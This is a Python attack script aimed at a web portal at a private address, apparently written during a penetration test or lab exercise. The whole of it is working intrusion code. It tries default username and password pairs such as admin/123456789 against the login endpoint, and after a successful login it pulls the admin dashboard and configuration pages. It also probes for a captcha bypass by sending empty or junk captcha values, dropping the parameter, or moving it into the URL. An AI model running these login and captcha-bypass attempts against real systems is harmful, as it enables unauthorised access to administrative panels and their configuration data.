import requests

TARGET = "http://10.0.0.1"
EXECUTE_URL = f"{TARGET}/execute.js"

# Try portal login (no captcha required)
print("=== Portal Login (execute.js) ===")
creds = [
    ("admin", "123456789"),
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("root", "123456789"),
    ("administrator", "123456789"),
]

for user, pw in creds:
    s = requests.Session()
    resp = s.post(EXECUTE_URL, params={"exec": "login"},
                 data={"username": user, "password": pw},
                 timeout=10)
    result = resp.text.strip()
    print(f"  {user}/{pw}: [{len(result)}b] '{result[:50]}'")
    
    # Check if we got a valid session
    if "1" == result or "success" in result.lower():
        print("  *** LOGIN SUCCESS ***")
        # Try accessing admin
        dash = s.get(f"{TARGET}/admin/index?action=dashboard.js", timeout=10)
        print(f"  Dashboard: [{len(dash.text)}b] {dash.text[:80]}")
        config = s.get(f"{TARGET}/admin/index?action=config.js", timeout=10)
        print(f"  Config: [{len(config.text)}b] {config.text[:200]}")
    elif "invalid" in result.lower():
        print(f"  (invalid credentials)")

# Try the admin-specific login endpoint
print("\n=== Admin Login (with captcha bypass attempts) ===")
s = requests.Session()

# Some captcha implementations have a test mode or predictable values
# Try empty captcha, or captcha with different session handling
for cap_bypass in ["", "0", "1", "null", "undefined", "false", "true", "-1", "9999"]:
    # Get fresh captcha
    s.get(f"{TARGET}/admin/index?action=captcha.js")
    
    resp = s.post(f"{TARGET}/admin/index?execute=1&exec=login",
                 data={"username": "admin", "password": "123456789", "captcha": cap_bypass},
                 timeout=10)
    result = resp.text.strip()
    if result != "CAPTCHA code is not the same":
        print(f"  captcha='{cap_bypass}': '{result[:50]}'")

# Try without captcha parameter
s2 = requests.Session()
s2.get(f"{TARGET}/admin/index?action=captcha.js")
resp = s2.post(f"{TARGET}/admin/index?execute=1&exec=login",
              data={"username": "admin", "password": "123456789"},
              timeout=10)
print(f"  no captcha param: '{resp.text.strip()[:50]}'")

# Try the captcha as GET parameter
s3 = requests.Session()
s3.get(f"{TARGET}/admin/index?action=captcha.js")
resp = s3.post(f"{TARGET}/admin/index?execute=1&exec=login&captcha=test",
              data={"username": "admin", "password": "123456789"},
              timeout=10)
print(f"  captcha in URL: '{resp.text.strip()[:50]}'")
